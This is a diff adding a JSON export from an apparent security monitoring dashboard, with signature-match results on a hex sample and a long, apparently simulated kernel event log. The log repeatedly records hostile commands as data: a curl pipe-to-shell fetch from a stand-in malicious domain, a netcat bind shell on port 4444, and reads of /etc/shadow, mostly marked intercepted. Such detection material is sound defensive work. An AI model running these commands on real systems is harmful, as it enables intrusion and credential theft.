@@ -1,0 +1,483 @@
+{
+  "meta": {
+    "suite": "Aegis Unified Security Suite",
+    "version": "v2.5.0-Enterprise",
+    "exported_by": "baalbek.313@gmail.com",
+    "compiled_timestamp_utc": "2026-06-07T11:01:47Z",
+    "system_time": "2026-09-23T04:24:34.485Z",
+    "threat_posture_configured": "HIGH",
+    "uncompromising_defense_active": true
+  },
+  "current_tool_viewing": "ast",
+  "real_time_statistics": {
+    "active_mitigations_count": 92,
+    "shannon_entropy_bytes_scanned": 0,
+    "shannon_entropy_peak_score": 0,
+    "active_binary_selection": "unknown_temp_sample.bin",
+    "diffie_hellman_handshake_prime": "3571",
+    "diffie_hellman_handshake_generator": "11",
+    "derived_ephemeral_key": "HKDF_PRK_SHA256_57aa6d45a8c7e9f2b1d30f4e"
+  },
+  "ast_static_scan": {
+    "checked_source_module_length": 503,
+    "ast_heuristics_vulnerability_matches": []
+  },
+  "signature_matching_ledger": {
+    "raw_hex_input_length_bytes": 28,
+    "untrusted_hex_dump": "// Malware packer template containing absolute signature matches\n4d 5a 90 00 03 00 00 00 04 00 00 00\n55 50 58 30 00 1a // Intercept point 1: UPX0 packer header!\naa bb cc dd ee ff 11 22 33 44\nc8 00 f2 ff // Intercept point 2: Aegis exploit shell trigger!\n99 88 77 66 55 44 33 22 11 00",
+    "malicious_signature_detections": [
+      {
+        "buffer_offset": 12,
+        "pattern_signature_catalog": "UPX Pack Header Marker (UPX0)",
+        "matched_bytes_sequence": "55 50 58 30"
+      },
+      {
+        "buffer_offset": 28,
+        "pattern_signature_catalog": "Aegis Sentinel Exploit pattern",
+        "matched_bytes_sequence": "c8 00 f2 ff"
+      }
+    ]
+  },
+  "ebpf_kernel_execution_logs": [
+    {
+      "event_id": "0.5270287074251907",
+      "timestamp_offset": "04:23:52",
+      "process_id": 16298,
+      "parent_process_id": 714,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.27145079541188943",
+      "timestamp_offset": "04:23:52",
+      "process_id": 30028,
+      "parent_process_id": 323,
+      "executable_name": "python3",
+      "invoked_system_call": "write",
+      "syscall_arguments": "fd: 1 (stdout), length: 14",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "low"
+    },
+    {
+      "event_id": "0.7867586843431964",
+      "timestamp_offset": "04:23:51",
+      "process_id": 30922,
+      "parent_process_id": 950,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.8758898455344742",
+      "timestamp_offset": "04:23:50",
+      "process_id": 16487,
+      "parent_process_id": 168,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.2185650770825831",
+      "timestamp_offset": "04:23:49",
+      "process_id": 10837,
+      "parent_process_id": 843,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.1771524126984031",
+      "timestamp_offset": "04:23:48",
+      "process_id": 2665,
+      "parent_process_id": 580,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.4214341679733262",
+      "timestamp_offset": "04:23:48",
+      "process_id": 6740,
+      "parent_process_id": 724,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.31134096259973965",
+      "timestamp_offset": "04:23:47",
+      "process_id": 19246,
+      "parent_process_id": 579,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.8791609758012321",
+      "timestamp_offset": "04:23:46",
+      "process_id": 6048,
+      "parent_process_id": 620,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.8646647946915673",
+      "timestamp_offset": "04:23:45",
+      "process_id": 22098,
+      "parent_process_id": 778,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.5330244683419983",
+      "timestamp_offset": "04:23:44",
+      "process_id": 11850,
+      "parent_process_id": 672,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.24880475284965553",
+      "timestamp_offset": "04:23:44",
+      "process_id": 24265,
+      "parent_process_id": 17,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.32650271161429734",
+      "timestamp_offset": "04:23:43",
+      "process_id": 26751,
+      "parent_process_id": 222,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.663319698245266",
+      "timestamp_offset": "04:23:42",
+      "process_id": 7462,
+      "parent_process_id": 393,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.303623064062874",
+      "timestamp_offset": "04:23:41",
+      "process_id": 8236,
+      "parent_process_id": 59,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.12937692214440166",
+      "timestamp_offset": "04:23:40",
+      "process_id": 9283,
+      "parent_process_id": 414,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.9858020737906549",
+      "timestamp_offset": "04:23:40",
+      "process_id": 22845,
+      "parent_process_id": 858,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.4568931042097608",
+      "timestamp_offset": "04:23:39",
+      "process_id": 3612,
+      "parent_process_id": 602,
+      "executable_name": "systemd",
+      "invoked_system_call": "epoll_wait",
+      "syscall_arguments": "maxevents: 32",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "low"
+    },
+    {
+      "event_id": "0.5514576977039879",
+      "timestamp_offset": "04:23:38",
+      "process_id": 6925,
+      "parent_process_id": 59,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.6726112452742198",
+      "timestamp_offset": "04:23:37",
+      "process_id": 3852,
+      "parent_process_id": 349,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.5758814935309611",
+      "timestamp_offset": "04:23:36",
+      "process_id": 11557,
+      "parent_process_id": 779,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.49222791196092996",
+      "timestamp_offset": "04:23:36",
+      "process_id": 1230,
+      "parent_process_id": 516,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.10865962089820014",
+      "timestamp_offset": "04:23:35",
+      "process_id": 24675,
+      "parent_process_id": 596,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.27039155517272595",
+      "timestamp_offset": "04:23:34",
+      "process_id": 15168,
+      "parent_process_id": 529,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.758962686306514",
+      "timestamp_offset": "04:23:33",
+      "process_id": 17957,
+      "parent_process_id": 248,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.6419063729836427",
+      "timestamp_offset": "04:23:32",
+      "process_id": 22217,
+      "parent_process_id": 414,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.21992558304365317",
+      "timestamp_offset": "04:23:32",
+      "process_id": 10787,
+      "parent_process_id": 596,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.9107478371326675",
+      "timestamp_offset": "04:23:31",
+      "process_id": 11902,
+      "parent_process_id": 647,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.8683290584029641",
+      "timestamp_offset": "04:23:30",
+      "process_id": 4902,
+      "parent_process_id": 418,
+      "executable_name": "nginx",
+      "invoked_system_call": "accept4",
+      "syscall_arguments": "client: 192.168.1.55:53299",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "low"
+    },
+    {
+      "event_id": "0.5704226106969822",
+      "timestamp_offset": "04:23:29",
+      "process_id": 3985,
+      "parent_process_id": 722,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.36874427476128513",
+      "timestamp_offset": "04:23:28",
+      "process_id": 16548,
+      "parent_process_id": 975,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.06453969667053916",
+      "timestamp_offset": "04:23:28",
+      "process_id": 15481,
+      "parent_process_id": 48,
+      "executable_name": "nc",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "-lvp 4444 -e /bin/sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.09275805265234915",
+      "timestamp_offset": "04:23:27",
+      "process_id": 20758,
+      "parent_process_id": 717,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.23841022372703247",
+      "timestamp_offset": "04:23:26",
+      "process_id": 26339,
+      "parent_process_id": 456,
+      "executable_name": "curl",
+      "invoked_system_call": "execve",
+      "syscall_arguments": "http://malcious-domain.com/payload.sh | sh",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.833972282099764",
+      "timestamp_offset": "04:23:25",
+      "process_id": 10033,
+      "parent_process_id": 412,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.0648893256267038",
+      "timestamp_offset": "04:23:24",
+      "process_id": 30693,
+      "parent_process_id": 980,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.20395962905742182",
+      "timestamp_offset": "04:23:24",
+      "process_id": 8066,
+      "parent_process_id": 637,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.0819054679093899",
+      "timestamp_offset": "04:23:23",
+      "process_id": 10226,
+      "parent_process_id": 828,
+      "executable_name": "bash",
+      "invoked_system_call": "setuid",
+      "syscall_arguments": "0",
+      "governing_sandbox_action": "allowed",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.4867078060067155",
+      "timestamp_offset": "04:23:22",
+      "process_id": 31598,
+      "parent_process_id": 467,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    },
+    {
+      "event_id": "0.5163430659072237",
+      "timestamp_offset": "04:23:21",
+      "process_id": 13348,
+      "parent_process_id": 544,
+      "executable_name": "cat",
+      "invoked_system_call": "openat",
+      "syscall_arguments": "/etc/shadow",
+      "governing_sandbox_action": "intercepted",
+      "incident_severity_classification": "high"
+    }
+  ]
+}
